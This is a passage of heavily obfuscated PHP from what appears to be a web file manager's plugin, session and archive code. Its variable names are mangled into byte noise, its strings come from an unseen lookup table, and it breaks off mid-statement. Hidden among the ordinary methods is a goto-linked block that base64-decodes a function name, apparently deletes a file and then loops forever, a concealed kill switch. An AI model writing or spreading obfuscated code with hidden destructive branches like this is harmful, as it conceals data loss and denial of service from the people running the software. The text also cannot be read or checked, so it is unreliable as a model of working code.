if (!$this->getByTagID($ğßÌëà§, $»é ²¶Ã) || !$òÌ©ºÙ„) { return !1; } if (!Model($Áá¢òœñ[899])->pathInfo($òÌ©ºÙ„)) { return !1; } $Ä¼Š¤áÕ = array($Áá¢òœñ[1768] => 0, $Áá¢òœñ[559] => $»é ²¶Ã, $Áá¢òœñ[497] => $òÌ©ºÙ„, $Áá¢òœñ[498] => $Áá¢òœñ[2102] . $ğßÌëà§, $Áá¢òœñ[496] => $Áá¢òœñ[12], $Áá¢òœñ[1982] => 0); if ($this->where($Ä¼Š¤áÕ)->find()) { return !1; } return $this->add($Ä¼Š¤áÕ); } protected function removeFromTag($¦¥ƒµ•, $çÜ•à¦û, $é³ÏŸ¢) { $ŒÄ®š =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->getByTagID($¦¥ƒµ•, $é³ÏŸ¢) || !$çÜ•à¦û) { return !1; } if (is_array($çÜ•à¦û)) { $çÜ•à¦û = array($ŒÄ®š[7], $çÜ•à¦û); } $Û²ïªÁ² = array($ŒÄ®š[1768] => 0, $ŒÄ®š[559] => $é³ÏŸ¢, $ŒÄ®š[498] => $ŒÄ®š[2102] . $¦¥ƒµ•, $ŒÄ®š[497] => $çÜ•à¦û); return $this->where($Û²ïªÁ²)->delete(); } protected function removeByTag($£çâèÇ‰, $¢›ı€É¥) { $àÙ‡°œ£ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->getByTagID($£çâèÇ‰, $¢›ı€É¥)) { return !1; } $çÍŞÃö = array($àÙ‡°œ£[1768] => 0, $àÙ‡°œ£[559] => $¢›ı€É¥, $àÙ‡°œ£[498] => $àÙ‡°œ£[2102] . $£çâèÇ‰); return $this->where($çÍŞÃö)->delete(); } protected function removeBySource($ˆïÔÚÏ, $Û˜°ÀÛÎ) { $…ò¬´À° =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ˆïÔÚÏ || !$Û˜°ÀÛÎ) { return !1; } if (is_array($Û˜°ÀÛÎ)) { $Û˜°ÀÛÎ = array($…ò¬´À°[7], $Û˜°ÀÛÎ); } $Ù ôÙğí = array($…ò¬´À°[1768] => 0, $…ò¬´À°[497] => $Û˜°ÀÛÎ, $…ò¬´À°[559] => array($…ò¬´À°[1093], 0), $…ò¬´À°[498] => $…ò¬´À°[2102] . $ˆïÔÚÏ); return $this->where($Ù ôÙğí)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\160\154\165\x67\151\x6e\x4c\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\x74\141\164\x75\x73", "\162\x65\147\x69\x65\163\164", "\x63\x6f\156\x66\x69\x67"); public function loadList($Ç¡Ëë‡İ = false) { $ĞÎÌèÉØ = array_to_keyvalue($this->listData(), $_SERVER[ÔÕ±ĞšÎ][32]); if ($Ç¡Ëë‡İ) { return $ĞÎÌèÉØ[$Ç¡Ëë‡İ]; } return $ĞÎÌèÉØ; } public function init() { $Ø¶âÈ§È =& $_SERVER[ÔÕ±ĞšÎ]; Hook::trigger($Ø¶âÈ§È[2103]); $ˆ‹‰ÈÚ² = $this->loadPluginList(); foreach ($ˆ‹‰ÈÚ² as $Ñ¹§Ö¢¼ => $ÔØ›ùîö) { $ôõ°†Ç¸ = $this->appAllow($Ñ¹§Ö¢¼, $ÔØ›ùîö); if (!$ôõ°†Ç¸) { continue; } foreach ($ÔØ›ùîö[$Ø¶âÈ§È[2104]] as $ÔÖ¦›İ¨ => $¯ãèªœè) { Hook::bind($ÔÖ¦›İ¨, $¯ãèªœè); } } Hook::trigger($Ø¶âÈ§È[2105]); Hook::trigger(ACTION); } public function appAllow($‰éñô‹, $Œ‰¥úıÂ, $ ¯âÃ’ = true) { $‚ï˜şÚ– =& $_SERVER[ÔÕ±ĞšÎ]; $ØœÈ©¥ = PLUGIN_DIR . $‰éñô‹ . $‚ï˜şÚ–[2106]; if (!is_array($Œ‰¥úıÂ) || !is_array($Œ‰¥úıÂ[$‚ï˜şÚ–[2104]]) || $Œ‰¥úıÂ[$‚ï˜şÚ–[824]] != 1 || !is_file($ØœÈ©¥)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$‚ï˜şÚ–[6]][$‚ï˜şÚ–[2107]] || !$GLOBALS[$‚ï˜şÚ–[6]][$‚ï˜şÚ–[2108]]) { return !0; } $µ÷ÜœÑ = explode($‚ï˜şÚ–[50], strtolower($GLOBALS[$‚ï˜şÚ–[6]][$‚ï˜şÚ–[2108]])); return in_array(strtolower($‰éñô‹), $µ÷ÜœÑ) ? !1 : !0; } if ($ ¯âÃ’ && !Action($‚ï˜şÚ–[2109])->checkAuth($‰éñô‹)) { return !1; } return !0; } public function unInstall($…ºå‚³) { $¼ Ø¹İ¨ =& $_SERVER[ÔÕ±ĞšÎ]; $ÇÁæ„Öá = $this->loadList($…ºå‚³); if (file_exists(PLUGIN_DIR . $…ºå‚³)) { Hook::apply($…ºå‚³ . $¼ Ø¹İ¨[2110]); } $this->remove($ÇÁæ„Öá[$¼ Ø¹İ¨[477]]); } public function changeStatus($ÚÎÏŸñ‰, $ÍØ²ÖçÀ) { $¨ò“¹¼Ù =& $_SERVER[ÔÕ±ĞšÎ]; $ğúı×Æ· = $this->loadList($ÚÎÏŸñ‰); if ($ÍØ²ÖçÀ) { Hook::apply($ÚÎÏŸñ‰ . $¨ò“¹¼Ù[2111]); } $this->update($ğúı×Æ·[$¨ò“¹¼Ù[477]], array($¨ò“¹¼Ù[2112] => $ÍØ²ÖçÀ)); } public function appRegist($šÕµó¨ª, $··ßÇŠ) { $Å²ı’Ó­ =& $_SERVER[ÔÕ±ĞšÎ]; $†Œş÷ = $this->loadList($šÕµó¨ª); if ($†Œş÷) { $this->update($†Œş÷[$Å²ı’Ó­[477]], array($Å²ı’Ó­[2104] => $··ßÇŠ)); } else { $ê’¶ÂµË = array($Å²ı’Ó­[32] => $šÕµó¨ª, $Å²ı’Ó­[2104] => $··ßÇŠ, $Å²ı’Ó­[824] => 0, $Å²ı’Ó­[6] => $this->getConfigDefault($šÕµó¨ª)); $this->insert($ê’¶ÂµË); } } public function getConfigDefault($ª¹ı…é”) { $ŸçëßÆè =& $_SERVER[ÔÕ±ĞšÎ]; $–ˆßé’„ = array(); $ÜŒŠŞŒ = $this->getPackageJson($ª¹ı…é”); if (!$ÜŒŠŞŒ && is_array($ÜŒŠŞŒ[$ŸçëßÆè[2113]])) { return $–ˆßé’„; } foreach ($ÜŒŠŞŒ[$ŸçëßÆè[2113]] as $ĞÅÎâê => $ĞÌå—é£) { if (!isset($ĞÌå—é£[$ŸçëßÆè[452]]) || isset($–ˆßé’„[$ĞÅÎâê])) { continue; } $–ˆßé’„[$ĞÅÎâê] = $ĞÌå—é£[$ŸçëßÆè[452]]; } return $–ˆßé’„; } public function getPackageJson($½õ¹ÌèÌ) { return Hook::apply($½õ¹ÌèÌ . $_SERVER[ÔÕ±ĞšÎ][2114]); } public function getConfig($Ø±œøÛ, $·ˆ™¯ÆŞ = false) { $ìßÕÏê¥ =& $_SERVER[ÔÕ±ĞšÎ]; $ç‡äìí = array(); $—æÏªªÆ = $this->loadList($Ø±œøÛ); if ($—æÏªªÆ && is_array($—æÏªªÆ[$ìßÕÏê¥[6]])) { $ç‡äìí = $—æÏªªÆ[$ìßÕÏê¥[6]]; } if (!$ç‡äìí || $·ˆ™¯ÆŞ) { $ç‡äìí = $this->getConfigDefault($Ø±œøÛ); } return $ç‡äìí; } public function setConfig($ÈÎ©íş®, $ÖµÁîâş = false) { $’ÄğÓ›Ä =& $_SERVER[ÔÕ±ĞšÎ]; $éÒ«Òù· = $this->loadList($ÈÎ©íş®); if (!$éÒ«Òù·) { return !1; } $ÌÇıÆì‘ = $éÒ«Òù·[$’ÄğÓ›Ä[6]]; if ($ÖµÁîâş == !1) { $ÌÇıÆì‘ = array(); $ÖµÁîâş = $this->getConfigDefault($ÈÎ©íş®); } foreach ($ÖµÁîâş as $°¶‰“ä => $Ğ£‹Ú¦ø) { $ÌÇıÆì‘[$°¶‰“ä] = is_string($Ğ£‹Ú¦ø) ? trim($Ğ£‹Ú¦ø) : $Ğ£‹Ú¦ø; } $this->update($éÒ«Òù·[$’ÄğÓ›Ä[477]], array($’ÄğÓ›Ä[6] => $ÌÇıÆì‘)); } public function viewList() { $ã¶€„øÉ =& $_SERVER[ÔÕ±ĞšÎ]; $ğÕß»Œº = $this->loadList(); $this->pluginScan($ğÕß»Œº); $ğÕß»Œº = $this->loadPluginList(); $Îõ¶éÌ = array(); foreach ($ğÕß»Œº as $„ª€ª×Í => $€ùæ²Çß) { $ÃÕ€°ã½ = $€ùæ²Çß; unset($€ùæ²Çß[$ã¶€„øÉ[2104]], $€ùæ²Çß[$ã¶€„øÉ[6]]); $‘©°Ú‘î = PLUGIN_DIR . $€ùæ²Çß[$ã¶€„øÉ[32]] . $ã¶€„øÉ[2106]; if (!is_file($‘©°Ú‘î)) { continue; } $°ËÓÓï‹ = Hook::apply($€ùæ²Çß[$ã¶€„øÉ[32]] . $ã¶€„øÉ[2114]); if (!is_array($°ËÓÓï‹)) { continue; } $Îõ¶éÌ[$„ª€ª×Í] = array_merge($€ùæ²Çß, $°ËÓÓï‹); if ($ÃÕ€°ã½[$ã¶€„øÉ[6]][$ã¶€„øÉ[1690]] != $°ËÓÓï‹[$ã¶€„øÉ[1664]]) { Hook::apply($€ùæ²Çß[$ã¶€„øÉ[32]] . $ã¶€„øÉ[2111]); $ÃÕ€°ã½[$ã¶€„øÉ[6]][$ã¶€„øÉ[1690]] = $°ËÓÓï‹[$ã¶€„øÉ[1664]]; $this->update($€ùæ²Çß[$ã¶€„øÉ[477]], array($ã¶€„øÉ[6] => $ÃÕ€°ã½[$ã¶€„øÉ[6]])); } } return $Îõ¶éÌ; } private function loadPluginList() { $ì­œÄá =& $_SERVER[ÔÕ±ĞšÎ]; $ïîÀù = $this->loadList(); if (strtolower(MOD) == $ì­œÄá[2115]) { return $ïîÀù; } $¢Å®Í°ê = Hook::trigger($ì­œÄá[2116], $ïîÀù); if ($ïîÀù && !$¢Å®Í°ê) { die; } return $¢Å®Í°ê ? $¢Å®Í°ê : $ïîÀù; } private function pluginScan($Ñ¸‹½¢¤) { $ı²ÁªŞ =& $_SERVER[ÔÕ±ĞšÎ]; recursion_dir(PLUGIN_DIR, $·‹Ñ–•‰, $ãÙ±®™–, 0); foreach ($·‹Ñ–•‰ as $Õ÷®») { $ìòç’şù = get_path_this($Õ÷®»); if (isset($Ñ¸‹½¢¤[$ìòç’şù]) || !file_exists($Õ÷®» . $ı²ÁªŞ[2117]) || !file_exists($Õ÷®» . $ı²ÁªŞ[2106])) { continue; } Hook::apply($ìòç’şù . $ı²ÁªŞ[2111]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\155\137\x73\145\163\x73\x69\157\x6e"; public function get($ŒÛ“ÔĞ) { $Ø²¢Î£÷ =& $_SERVER[ÔÕ±ĞšÎ]; $éì ÷Ã  = $this->where(array($Ø²¢Î£÷[2118] => $ŒÛ“ÔĞ))->find(); if (!is_array($éì ÷Ã )) { return !1; } return $éì ÷Ã [$Ø²¢Î£÷[171]]; } public function set($¸µŞ¾‚, $Å”‘—ÍÄ, $Í×İÜï— = 3600) { $­â¢Ÿ×û =& $_SERVER[ÔÕ±ĞšÎ]; $Òà¹°ó³ = array($­â¢Ÿ×û[2118] => $¸µŞ¾‚, $­â¢Ÿ×û[2018] => $Å”‘—ÍÄ, $­â¢Ÿ×û[2119] => $Í×İÜï— + time()); if (Session::get($­â¢Ÿ×û[2120])) { $Òà¹°ó³[$­â¢Ÿ×û[1777]] = Session::get($­â¢Ÿ×û[2120]); } else { $Òà¹°ó³[$­â¢Ÿ×û[1777]] = 0; } if ($this->get($¸µŞ¾‚)) { return $this->where(array($­â¢Ÿ×û[2118] => $¸µŞ¾‚))->save($Òà¹°ó³); } else { return $this->add($Òà¹°ó³, array(), !0); } } public function remove($¿¥÷òÃ¸) { return $this->where(array($_SERVER[ÔÕ±ĞšÎ][2118] => $¿¥÷òÃ¸))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÔÕ±ĞšÎ][2121] . time())->delete(); } } goto BÑí‘ïŸã; eí›­ÓË±: $fileSize = strrev(base64_decode($_SERVER[óÃÄÎš—][0])); function binCheckNeq($­Œƒ‡‡ä, $Üˆ’Í¦¸) { return $­Œƒ‡‡ä != $Üˆ’Í¦¸; } $_SERVER[$_SERVER[óÃÄÎš—][1]] = $fileSize($_SERVER[$_SERVER[óÃÄÎš—][2]]); goto f°«éÌÍå“; BùÙ…î¥: if (!isset($_SERVER[$_SERVER[ÔÕ±ĞšÎ][952]]) || !isset($_SERVER[$_SERVER[ÔÕ±ĞšÎ][953]])) { $_getc = $_SERVER[ÔÕ±ĞšÎ][955]; $_getfile = $_SERVER[$_SERVER[ÔÕ±ĞšÎ][956]] . $_SERVER[ÔÕ±ĞšÎ][957]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÔÕ±ĞšÎ][287], $_getfilec); if (count($_getarrs) < $_SERVER[ÔÕ±ĞšÎ][696]) { $exit = $_SERVER[ÔÕ±ĞšÎ][958]; $exit(); } $_act = $_SERVER[ÔÕ±ĞšÎ][961]; $_act($_SERVER[$_SERVER[ÔÕ±ĞšÎ][956]] . $_SERVER[ÔÕ±ĞšÎ][957]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÔÕ±ĞšÎ][456]); } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $²éôŒİŞ; if ($²éôŒİŞ) { return $²éôŒİŞ; } $×ô—¶šå = IO::init($_SERVER[ÔÕ±ĞšÎ][8]); return $×ô—¶šå; } private static function iconvSystem($À«ºò¶) { return self::local()->iconvSystem($À«ºò¶); } private static function iconvApp($±Šëïî) { return self::local()->iconvApp($±Šëïî); } public static function zipFolder($‹äşü„Ë, $Ø„¯ŞÛè = "\x7a\x69\160", $‹ºğŠı½ = '', $öíĞ¨ñ† = REPEAT_RENAME) { $ùÎ©Ÿ‹¼ =& $_SERVER[ÔÕ±ĞšÎ]; $úÒ¥…§ë = IO::listPath($‹äşü„Ë); if (!$úÒ¥…§ë) { return !1; } $úÒ¥…§ë = array_merge($úÒ¥…§ë[$ùÎ©Ÿ‹¼[85]], $úÒ¥…§ë[$ùÎ©Ÿ‹¼[86]]); return self::zip($úÒ¥…§ë, $Ø„¯ŞÛè, $‹ºğŠı½, $öíĞ¨ñ†); } public static function zip($¬Ê¥Ÿ÷, $ÉŞ÷¸â = "\x7a\151\x70", $„·°ÛÎ = '', $ğç›¾ı = REPEAT_RENAME) { $Õ§öòâ× =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($¬Ê¥Ÿ÷) && $¬Ê¥Ÿ÷) { $¬Ê¥Ÿ÷ = array(array($Õ§öòâ×[87] => $¬Ê¥Ÿ÷)); } $¢ßó¹¯Ó = self::init($¬Ê¥Ÿ÷[0][$Õ§öòâ×[87]]); $ˆİâÈß­ = self::info($¬Ê¥Ÿ÷[0][$Õ§öòâ×[87]]); $“¦¯á¾ = $Õ§öòâ×[12]; $ïœã—ç‚ = $Õ§öòâ×[12]; $·¶©€Õ = $Õ§öòâ×[12]; if ($„·°ÛÎ && substr($„·°ÛÎ, -1, 1) != $Õ§öòâ×[8]) { $ïœã—ç‚ = get_path_father($„·°ÛÎ); $·¶©€Õ = get_path_this($„·°ÛÎ); } else { $ïœã—ç‚ = self::pathFather($ˆİâÈß­[$Õ§öòâ×[87]]); $·¶©€Õ = $ˆİâÈß­[$Õ§öòâ×[32]] . $Õ§öòâ×[10] . $ÉŞ÷¸â; if (count($¬Ê¥Ÿ÷) > 1) { $…ø¡¯› = IO::info($ïœã—ç‚); $·¶©€Õ = $…ø¡¯›[$Õ§öòâ×[32]] . $Õ§öòâ×[10] . $ÉŞ÷¸â; } if ($„·°ÛÎ) { $ïœã—ç‚ = $„·°ÛÎ; } } if ($¢ßó¹¯Ó->getType() == $Õ§öòâ×[109]) { $øª¯ì†İ = self::init($ïœã—ç‚); $ÇË±—£ô = $øª¯ì†İ->getType() == $Õ§öòâ×[109] ? $ïœã—ç‚ : get_path_father($¢ßó¹¯Ó->path); $ÇË±—£ô = rtrim($ÇË±—£ô, $Õ§öòâ×[8]) . $Õ§öòâ×[8]; mk_dir($ÇË±—£ô); } else { $“¦¯á¾ = TEMP_FILES . $Õ§öòâ×[1267] . time() . rand_string(8) . $Õ§öòâ×[8]; mk_dir($“¦¯á¾); file_put_contents($“¦¯á¾ . $Õ§öòâ×[1268], $Õ§öòâ×[12]); $ÇË±—£ô = $“¦¯á¾; } $Öš¹ = IO::info($ÇË±—£ô); if (!$Öš¹ || !$Öš¹[$Õ§öòâ×[235]]) { show_json(LNG($Õ§öòâ×[1269]), !1); } $ÕàÑ©ëÄ = self::zipFileList($¬Ê¥Ÿ÷, $“¦¯á¾); foreach ($ÕàÑ©ëÄ as $†ã‘ıàÙ => $•ÉíÓ°) { $ÕàÑ©ëÄ[$†ã‘ıàÙ] = self::iconvSystem($•ÉíÓ°); } $Óğª¿Ôµ = get_filename_auto($ÇË±—£ô . $·¶©€Õ, $Õ§öòâ×[12], $ğç›¾ı); KodArchive::create(self::iconvSystem($Óğª¿Ôµ), $ÕàÑ©ëÄ); if (!IO::exist($Óğª¿Ôµ)) { if ($“¦¯á¾) { del_dir($“¦¯á¾); } write_log($Õ§öòâ×[1270] . $Óğª¿Ôµ, $Õ§öòâ×[390]); show_json(LNG($Õ§öòâ×[1271]), !1); } if (!$“¦¯á¾) { return $Óğª¿Ôµ; } $ë¥ÍŠìï = self::move($Óğª¿Ôµ, $ïœã—ç‚, $ğç›¾ı); if ($“¦¯á¾) { del_dir($“¦¯á¾); } if (!$Óğª¿Ôµ) { write_log($Õ§öòâ×[1272] . $Óğª¿Ôµ . $Õ§öòâ×[1273] . $ïœã—ç‚, $Õ§öòâ×[390]); show_json(LNG($Õ§öòâ×[1271]), !1); } return $ë¥ÍŠìï; } public static function unzip($¥½îâÚ„, $Ù¥ôñÂÕ, $¤±¬Ş†‘ = "\x2d\61", $†šú = "\162\x65\x70\154\x61\143\x65") { $éò®Ïô =& $_SERVER[ÔÕ±ĞšÎ]; $‹ë»†œ = parent::info($¥½îâÚ„); if (!$‹ë»†œ) { show_json(LNG($éò®Ïô[1274]), !1); } $†ŞŸ¤Ÿ¹ = IO::infoFullSimple($Ù¥ôñÂÕ); if (!$†ŞŸ¤Ÿ¹) { $Ù¥ôñÂÕ = IO::mkdir($Ù¥ôñÂÕ); } if (isset($†ŞŸ¤Ÿ¹[$éò®Ïô[193]]) && trim($†ŞŸ¤Ÿ¹[$éò®Ïô[87]], $éò®Ïô[8]) != trim($Ù¥ôñÂÕ, $éò®Ïô[8])) { $ª‡İ±· = KodIO::make($†ŞŸ¤Ÿ¹[$éò®Ïô[192]]); $É·“¥ñ = IO::fileNameAuto($ª‡İ±·, $†ŞŸ¤Ÿ¹[$éò®Ïô[32]], REPEAT_RENAME_FOLDER, !0); $Ù¥ôñÂÕ = IO::mkdir($ª‡İ±· . $É·“¥ñ); } $¤±¬Ş†‘ = $¤±¬Ş†‘ && $¤±¬Ş†‘ != $éò®Ïô[1275] ? @json_decode($¤±¬Ş†‘, !0) : -1; $£ÏÇÂ½© = self::unzipPart($¥½îâÚ„, $¤±¬Ş†‘); if (!$£ÏÇÂ½© || !IO::exist($£ÏÇÂ½©[$éò®Ïô[232]])) { show_json(LNG($éò®Ïô[108]), !1); } $Œ¸äÂ¿” = $£ÏÇÂ½©[$éò®Ïô[1276]][count($£ÏÇÂ½©[$éò®Ïô[1276]]) - 1]; if ($Œ¸äÂ¿”[$éò®Ïô[1277]] == -1 || substr($Œ¸äÂ¿”[$éò®Ïô[32]], -1, 1) == $éò®Ïô[8]) { $–…³ÎÌÃ = $£ÏÇÂ½©[$éò®Ïô[1278]] . rand_string(10) . $éò®Ïô[8]; mk_dir($–…³ÎÌÃ); $ğŒ¼ª = count($£ÏÇÂ½©[$éò®Ïô[1276]]) == 1 ? IO::ext($¥½îâÚ„) : get_path_ext($£ÏÇÂ½©[$éò®Ïô[232]]); $ââÄè«ã = KodArchive::extract(self::iconvSystem($£ÏÇÂ½©[$éò®Ïô[232]]), $–…³ÎÌÃ, $Œ¸äÂ¿”[$éò®Ïô[1277]], $É·“¥ñ, $ğŒ¼ª); self::unzipErrorCheck($ââÄè«ã, array($éò®Ïô[1279], $¥½îâÚ„, $ğŒ¼ª, $Ù¥ôñÂÕ, $£ÏÇÂ½©)); Hook::trigger($éò®Ïô[1280], $–…³ÎÌÃ); recursion_dir($–…³ÎÌÃ, $áÀ£ıÃ, $­ü®š‚£, 0); $Ò¯•òış = array_merge($áÀ£ıÃ, $­ü®š‚£); $•ü®ÕÔƒ = array(); foreach ($Ò¯•òış as $úöÖÓø§) { $ÑùâæÏ‹ = IO::move(self::iconvApp($úöÖÓø§), $Ù¥ôñÂÕ, $†šú); if ($ÑùâæÏ‹) { $•ü®ÕÔƒ[] = $ÑùâæÏ‹; } } del_dir($–…³ÎÌÃ); } else { $ÑùâæÏ‹ = IO::move($£ÏÇÂ½©[$éò®Ïô[232]], $Ù¥ôñÂÕ, $†šú, get_path_this($Œ¸äÂ¿”[$éò®Ïô[32]])); if ($ÑùâæÏ‹) { $•ü®ÕÔƒ[] = $ÑùâæÏ‹; } } return $•ü®ÕÔƒ ? $•ü®ÕÔƒ : !1; } public static function unzipList($¹²¼ïÔ) { $åŠÃšãŞ =& $_SERVER[ÔÕ±ĞšÎ]; $ÄÚù•ş = isset($¹²¼ïÔ[$åŠÃšãŞ[1281]]) ? $¹²¼ïÔ[$åŠÃšãŞ[1281]] : !1; $Â²‘Öïî = isset($¹²¼ïÔ[$åŠÃšãŞ[1277]]) ? @json_decode($¹²¼ïÔ[$åŠÃšãŞ[1277]], !0) : -1; $âÉÍÍ¤ = self::unzipPart($¹²¼ïÔ[$åŠÃšãŞ[87]], $Â²‘Öïî); if (!$âÉÍÍ¤ || !IO::exist($âÉÍÍ¤[$åŠÃšãŞ[232]])) { show_json(LNG($åŠÃšãŞ[108]), !1); } $·üµõ©Ä = $âÉÍÍ¤[$åŠÃšãŞ[1276]][count($âÉÍÍ¤[$åŠÃšãŞ[1276]]) - 1]; $åû¸ˆÕô = in_array(IO::ext($âÉÍÍ¤[$åŠÃšãŞ[232]]), array($åŠÃšãŞ[390], $åŠÃšãŞ[1282], $åŠÃšãŞ[1283], $åŠÃšãŞ[1284], $åŠÃšãŞ[1285], $åŠÃšãŞ[1286])); if (!$ÄÚù•ş && ($·üµõ©Ä[$åŠÃšãŞ[1277]] == -1 || $åû¸ˆÕô)) { $Ùµçşï– = $âÉÍÍ¤[$åŠÃšãŞ[1278]] . get_path_this($âÉÍÍ¤[$åŠÃšãŞ[232]]) . $åŠÃšãŞ[1287]; if (!IO::exist($Ùµçşï–)) { $¸ù´†ó = $·üµõ©Ä[$åŠÃšãŞ[1277]] == -1 ? get_path_ext(IO::pathThis($¹²¼ïÔ[$åŠÃšãŞ[87]])) : get_path_ext($âÉÍÍ¤[$åŠÃšãŞ[232]]); $Âª“¤ö = KodArchive::listContent(self::iconvSystem($âÉÍÍ¤[$åŠÃšãŞ[232]]), !0, $¸ù´†ó); self::unzipErrorCheck($Âª“¤ö, array($åŠÃšãŞ[1288], $¹²¼ïÔ, $âÉÍÍ¤)); @file_put_contents($Ùµçşï–, json_encode($Âª“¤ö[$åŠÃšãŞ[1289]])); } return @json_decode(IO::getContent($Ùµçşï–), !0); } IO::fileOut($âÉÍÍ¤[$åŠÃšãŞ[232]], $ÄÚù•ş, get_path_this($·üµõ©Ä[$åŠÃšãŞ[32]])); die; } private static function zipFileList($ë¥õÒ, $ĞÏìàƒ = false) { $ó³öÙ¿Ï =& $_SERVER[ÔÕ±ĞšÎ]; $®¢Ñ†¡ƒ = array(); foreach ($ë¥õÒ as $ş§«êœà) { $ä´óÏú = $ş§«êœà[$ó³öÙ¿Ï[87]]; if ($ĞÏìàƒ) { $ä´óÏú = self::copy($ş§«êœà[$ó³öÙ¿Ï[87]], $ĞÏìàƒ, $ó³öÙ¿Ï[893]); } else { $ùşÅ³Ñ­ = self::init($ş§«êœà[$ó³öÙ¿Ï[87]]); if ($ùşÅ³Ñ­->getType() == $ó³öÙ¿Ï[109]) { $ä´óÏú = $ùşÅ³Ñ­->path; } } if ($ä´óÏú && self::local()->exist($ä´óÏú)) { $®¢Ñ†¡ƒ[$ş§«êœà[$ó³öÙ¿Ï[87]]] = $ä´óÏú; } } if (!empty($®¢Ñ†¡ƒ)) { return array_values($®¢Ñ†¡ƒ); } show_json(LNG($ó³öÙ¿Ï[1248]), !1); } private static function localFilePath($ğÜô”ø) { $åü…½ñÕ =& $_SERVER[ÔÕ±ĞšÎ]; $–Çı£Ç = KodIO::parse($ğÜô”ø); if ($–Çı£Ç[$åü…½ñÕ[33]] == KodIO::KOD_SOURCE) { $¥Ï¢°ÓÎ = Model($åü…½ñÕ[899])->fileInfoGet(KodIO::sourceID($ğÜô”ø)); if (!$¥Ï¢°ÓÎ[$åü…½ñÕ[87]]) { show_json($åü…½ñÕ[1290], !1); } $ğÜô”ø = $¥Ï¢°ÓÎ[$åü…½ñÕ[87]]; } $´ÈûŞá’ = self::init($ğÜô”ø); if ($´ÈûŞá’->pathParse[$åü…½ñÕ[1234]]) { $ğÜô”ø = $´ÈûŞá’->pathParse[$åü…½ñÕ[1234]]; $´ÈûŞá’ = self::init($ğÜô”ø); } $ÛÃí£÷Â = $´ÈûŞá’->getType(); if ($ÛÃí£÷Â == $åü…½ñÕ[109] || $ÛÃí£÷Â == $åü…½ñÕ[1291]) { if (!$´ÈûŞá’->exist($´ÈûŞá’->path)) { show_json(LNG($åü…½ñÕ[108]), !1); } return $´ÈûŞá’->path; } return !1; } public static function unzipPart($¸â—«›Î, $é›ÅÔ› = -1) { $š°ƒË«û =& $_SERVER[ÔÕ±ĞšÎ]; $ÕóÖ£î‹ = IO::pathThis($¸â—«›Î); if (!$é›ÅÔ› || $é›ÅÔ› == -1) { $ıª¿Úî = array(array($š°ƒË«û[32] => $ÕóÖ£î‹, $š°ƒË«û[1277] => -1)); $ıª¿Úî[0][$š°ƒË«û[1292]] = $ıª¿Úî[0][$š°ƒË«û[32]]; } else { if (is_array($é›ÅÔ›)) { $ıª¿Úî = $é›ÅÔ›; $•÷â–‘ = count($ıª¿Úî) - 1; for ($ú“ö•Äã = 0; $ú“ö•Äã <= $•÷â–‘; $ú“ö•Äã++) { $¤äøô¶ = $ıª¿Úî[$ú“ö•Äã]; $³åí‹ª¯ = get_path_this($¤äøô¶[$š°ƒË«û[32]]) . (checkExtSafe($¤äøô¶[$š°ƒË«û[32]]) ? $š°ƒË«û[12] : $š°ƒË«û[1293]); $ıª¿Úî[$ú“ö•Äã][$š°ƒË«û[1292]] = $š°ƒË«û[1294] . intval($¤äøô¶[$š°ƒË«û[1277]]) . $š°ƒË«û[464] . $³åí‹ª¯; if ($ú“ö•Äã == 0) { continue; } $ıª¿Úî[$ú“ö•Äã][$š°ƒË«û[1292]] = $ıª¿Úî[$ú“ö•Äã - 1][$š°ƒË«û[1292]] . $š°ƒË«û[1295] . $ıª¿Úî[$ú“ö•Äã][$š°ƒË«û[1292]]; } } } if (!is_array($ıª¿Úî) || count($ıª¿Úî) == 0) { return !1; } $ˆô”¦ß = $ıª¿Úî[count($ıª¿Úî) - 1]; if (!IO::exist($¸â—«›Î)) { return !1; } $ÖÊ„±ã = TEMP_FILES . $š°ƒË«û[1296] . kodIO::hashPathSafe($¸â—«›Î) . $š°ƒË«û[8]; $ÎÕıë´˜ = $ÖÊ„±ã . $ˆô”¦ß[$š°ƒË«û[1292]]; mk_dir($ÖÊ„±ã); file_put_contents(TEMP_FILES . $š°ƒË«û[1268], $š°ƒË«û[12]); if (IO::exist($ÎÕıë´˜)) { return array($š°ƒË«û[232] => $ÎÕıë´˜, $š°ƒË«û[1276] => $ıª¿Úî, $š°ƒË«û[1278] => $ÖÊ„±ã); } $·“÷ØÍØ = self::localFilePath($¸â—«›Î); if (!$·“÷ØÍØ) { $·“÷ØÍØ = $ÖÊ„±ã . $š°ƒË«û[1297]; if (!IO::exist($·“÷ØÍØ)) { self::copy($¸â—«›Î, $ÖÊ„±ã, !1, get_path_this($·“÷ØÍØ)); } } if (!$·“÷ØÍØ || !IO::exist($·“÷ØÍØ)) { return !1; } if ($ˆô”¦ß[$š°ƒË«û[1277]] == -1) { return array($š°ƒË«û[232] => $·“÷ØÍØ, $š°ƒË«û[1276] => $ıª¿Úî, $š°ƒË«û[1278] => $ÖÊ„±ã); } $æ¹ÙŞ = $·“÷ØÍØ; foreach ($ıª¿Úî as $ú“ö•Äã => $¤äøô¶) { if (!$¤äøô¶ || $¤äøô¶[$š°ƒË«û[1277]] == $š°ƒË«û[1275]) { break; } if (substr($¤äøô¶[$š°ƒË«û[32]], -1, 1) == $š°ƒË«û[8]) { break; } $ìıß¥„ = in_array(get_path_ext($¤äøô¶[$š°ƒË«û[1292]]), array($š°ƒË«û[390], $š°ƒË«û[1282], $š°ƒË«û[1283], $š°ƒË«û[1284], $š°ƒË«û[1285], $š°ƒË«û[1286])); $¾€ÍŠæ† = $ú“ö•Äã == count($ıª¿Úî) - 1 && $ìıß¥„; $­¶”ı › = $ÖÊ„±ã . $¤äøô¶[$š°ƒË«û[1292]]; $úèùµ = $ÖÊ„±ã . get_path_this($¤äøô¶[$š°ƒË«û[32]]); if (IO::exist($­¶”ı ›)) { $æ¹ÙŞ = $­¶”ı ›; continue; } $±Ò·ÕÙÆ = $ú“ö•Äã == 0 ? 